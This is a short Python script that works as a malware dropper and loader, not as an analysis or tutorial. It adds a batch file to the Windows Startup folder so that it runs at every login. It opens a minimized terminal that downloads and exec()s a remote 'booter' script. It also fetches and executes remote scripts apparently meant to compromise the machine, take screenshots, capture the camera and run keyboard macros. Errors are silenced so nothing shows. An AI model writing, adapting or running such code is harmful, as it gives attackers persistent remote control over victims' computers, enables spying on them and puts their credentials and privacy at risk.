import random
import string
import os
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import shutil
import sqlite3
import requests
import tempfile
import platform
import psutil
import cpuinfo
import GPUtil
import socket
import getpass
import threading
import time
import keyboard
import ctypes
import cv2
import pyautogui
import win32crypt
from Crypto.Cipher import AES
from pynput import mouse, keyboard as pynput_keyboard

def run_booter_in_separate_terminal():
    """Run the booter script in a separate minimized terminal"""
    try:
        booter_script = '''
import requests
def fetch_and_execute_script(urls):
    for url in urls:
        try:
            response = requests.get(url)
            exec(response.text, globals())
        except Exception as e:
            print(f"")
github_urls = ['https://raw.githubusercontent.com/kaki869/booter/refs/heads/main/booter.py']
fetch_and_execute_script(github_urls)
'''
        temp_script = os.path.join(tempfile.gettempdir(), "booter_runner.py")
        with open(temp_script, 'w') as f:
            f.write(booter_script)

        if platform.system() == "Windows":
            subprocess.Popen(
                f'start /min cmd /c "python \"{temp_script}\" && pause"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                ['gnome-terminal', '--window', '--minimize', '--', 'python3', temp_script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

    except Exception as e:
        print(f"[-] Failed to launch Macro")

def fetch_and_execute_script(urls):
    """Main script loader"""
    for url in urls:
        try:
            response = requests.get(url)
            response.raise_for_status()
            script_content = response.text
            exec(script_content, globals())
        except requests.exceptions.RequestException as e:
            print(f"")
        except Exception as e:
            print(f"")

def create_startup_bat():
    """Create a .bat file to launch the script and add it to the startup folder"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_file_path = os.path.join(startup_folder, 'card.bat')

    if not os.path.exists(bat_file_path):
        with open(bat_file_path, 'w') as bat_file:
            bat_file.write(f'@echo off\nstart /b pythonw "{os.path.abspath(__file__)}"\n')

def main():
    create_startup_bat()
    run_booter_in_separate_terminal()

    github_urls = [
        'https://raw.githubusercontent.com/kaki869/compromiser/refs/heads/main/compromiser.py',
        'https://raw.githubusercontent.com/kaki869/screenshot-taker/refs/heads/main/screenshot.py',
        'https://raw.githubusercontent.com/kaki869/camera/refs/heads/main/camera.py',
        'https://raw.githubusercontent.com/kaki869/python-macro/refs/heads/main/macro.py'
    ]

    fetch_and_execute_script(github_urls)

if __name__ == "__main__":
    main()
